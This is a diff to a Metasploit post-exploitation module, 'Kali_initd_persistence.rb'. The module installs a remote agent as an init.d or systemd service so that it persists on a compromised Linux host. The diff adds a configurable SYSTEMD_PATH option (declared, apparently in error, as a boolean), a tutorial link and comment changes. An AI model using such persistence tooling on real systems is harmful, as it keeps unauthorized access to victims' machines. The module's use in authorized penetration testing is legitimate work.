@@ -10,6 +10,7 @@
 # Exploit Title  : Kali_initd_persistence.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
 # Tested on      : Linux Kali 2.0
+# video tutorial : https://www.youtube.com/watch?v=Ag7ufLORbFs
 #
 #
 # [ DESCRIPTION ]
@@ -23,19 +24,21 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on           => set SESSION 3
-# The full remote path of binary to execute (remote) => set REMOTE_PATH /root/agent
-# Time to wait for the agent to start   (in seconds) => set START_TIME 15
-# The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
-# Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
-# Execute one simple bash command           (remote) => set SINGLE_COM uname -a
-# Use 'systemd' insted of 'init.d' to persiste?      => set SYSTEMD true
-# Use agents with [shebang]? (eg #!/usr/bin/python)  => set SHEBANG true
+# The session number to run this module on        => set SESSION 3
+# The full remote path of binary to execute       => set REMOTE_PATH /root/agent
+# Time to wait for the agent to start             => set START_TIME 15
+# The full remote path of init.d directory        => set INIT_PATH /etc/init.d
+# Delete persistence script/configurations        => set DEL_PERSISTENCE true
+# Execute one simple remote bash command          => set SINGLE_COM uname -a
+# Use 'systemd' insted of 'init.d' to persiste    => set SYSTEMD true
+# The full remote path of systemd directory       => set SYSTEMD_PATH /etc/systemd/system
+# Use agents with shebang? (eg #!/usr/bin/python) => set SHEBANG true
 # ---
 # If sellected 'SHEBANG true' then agent execution will be based on is shebang
 # EXAMPLE: #!/bin/sh agents will be executed         : sh /root/agent.sh
 # EXAMPLE: #!/usr/bin/python agents will be executed : python /root/agent.py
 # HINT: Rename your agent name to 'agent' when using 'SHEBANG true' option ..
+# HINT: This funtion will not use 'START_TIME' 'INIT_PATH' or 'SHEBANG' options.
 # ---
 #
 #
@@ -130,6 +133,7 @@ class MetasploitModule < Msf::Post
                                          'SESSION' => '1',             # Default its to run againts session 1
                                          'START_TIME' => '8',          # Default time (sec) to start remote agent
                                          'INIT_PATH' => '/etc/init.d', # Default init.d remote directory full path
+                                         'SYSTEMD_PATH' => '/etc/systemd/system', # Default systemd directory
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -148,7 +152,8 @@ class MetasploitModule < Msf::Post
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
                                 OptBool.new('SYSTEMD', [ false, 'Use systemd insted of init.d to persiste our agent?' , false]),
-                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)'])
+                                OptBool.new('SYSTEMD_PATH', [ false, 'The full remote path of systemd directory' , false]),
+                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory'])
                         ], self.class) 
 
         end
@@ -185,8 +190,8 @@ def ls_stage1
 #
 if datastore['SYSTEMD'] == true
 
-  serv_path = "/etc/systemd/system"
-  serv_file = "/etc/systemd/system/persistence.service"
+  serv_path = datastore['SYSTEMD_PATH'] # /etc/systemd/system
+  serv_file = "#{serv_path}/persistence.service"
     #
     # Check if persistence its allready active ..
     #
@@ -406,8 +411,8 @@ def ls_stage2
 #
 if datastore['SYSTEMD'] == true
 
-  serv_path = "/etc/systemd/system"
-  serv_file = "/etc/systemd/system/persistence.service"
+  serv_path = datastore['SYSTEMD_PATH'] # /etc/systemd/system
+  serv_file = "#{serv_path}/persistence.service"
     #
     # Check systemd persiste script existance ..
     #
